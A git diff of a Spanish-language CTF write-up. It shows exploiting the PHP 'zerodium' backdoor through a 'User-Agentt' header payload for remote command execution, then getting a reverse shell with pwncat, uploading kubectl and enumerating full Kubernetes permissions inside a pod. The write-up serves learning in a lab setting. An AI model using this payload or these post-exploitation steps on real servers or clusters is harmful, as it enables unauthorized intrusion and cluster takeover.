@@ -200,7 +200,7 @@ Despues de lanzar los scripts basicos de reconocimiento de nmap hemos obtenido t
   ![image](https://github.com/Esevka/CTF/assets/139042999/433b67b9-738a-4b4d-80cc-2fc0cb5e67cb)
 
   Buscando info sobre la version de php que esta corriendo la maquina encontramos un backdoor para esta version que nos permite realizar un RCE,
-  analizamos el backdoor y vemos que enviando en la cabecera de la solicitud  ---- "User-Agentt": "zerodiumsystem('" + cmd + "');" ---- podemos ejecutar comandos.
+  analizamos el backdoor y vemos que enviando en la cabecera de la solicitud "User-Agentt": "zerodiumsystem('" + cmd + "');" podemos ejecutar comandos.
 
   Exploit: https://www.exploit-db.com/exploits/49933
 
@@ -255,7 +255,9 @@ Despues de lanzar los scripts basicos de reconocimiento de nmap hemos obtenido t
     root@php-deploy-6d998f68b9-wlslz:/var/www/html# export TERM=xterm
     root@php-deploy-6d998f68b9-wlslz:/var/www/html# stty rows 42 columns 174
 
--Sabemos que la maquina esta ejecutando kubernetes, por lo que intentamos tirar de ---> Kubectl(es una interfaz de línea de comandos para ejecutar comandos sobre despliegues clusterizados de Kubernetes) y vemos que no esta instalada en la maquina. Listando las variables de entorno vemos que si que verdaderanmente kubernete esta funcionando en la maquina
+-Sabemos que la maquina esta ejecutando kubernetes, por lo que intentamos tirar de ---> Kubectl(no esta instalado)
+
+Listando las variables de entorno vemos que si que verdaderanmente kubernete esta funcionando en la maquina
 
         root@php-deploy-6d998f68b9-wlslz:/var/www/html# env
         KUBERNETES_SERVICE_PORT_HTTPS=443
@@ -285,7 +287,7 @@ Despues de lanzar los scripts basicos de reconocimiento de nmap hemos obtenido t
         PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
         _=/usr/bin/env
 
--La maquina no nos da la opcion de usar curl, wget, netcat para subir kubectl a la maquina victima, por lo que vamos a tener que volver a realizar la conexion tirando de pwncat-cs
+-La maquina no nos da la opcion de usar curl, wget, netcat para subir kubectl a la maquina victima, por lo que vamos a tener que volver a realizar la conexion tirando de pwncat
 
 ## Obtenemos Reverse Shell mediante Pwncat.
 
@@ -320,6 +322,24 @@ Despues de lanzar los scripts basicos de reconocimiento de nmap hemos obtenido t
     /tmp/kubectl ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 49.3/49.3 MB • 1.4 MB/s • 0:00:00
     [18:46:44] uploaded 49.26MiB in 42.07 seconds                                                                                                                     upload.py:76
     
+damos permisos de ejecucion ya que de lo contrario no podremos ejecutarlo
+    
+    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# chmod +x kubectl 
 
+-Enumeramos Kubernete
+
+Con la ayuda de kubectl hemos conseguido ver que acciones podemos realizar, los dos comandos nos indican lo mismo si no me equivoco(# Check to see if I can do everything in my current namespace)
+
+    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl auth can-i '*' '*'
+    yes
+    
+    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl auth can-i --list 
+    Resources   Non-Resource URLs   Resource Names   Verbs
+    *.*         []                  []               [*]
+                [*]                 []               [*]
+
+-
+
+    
 
 
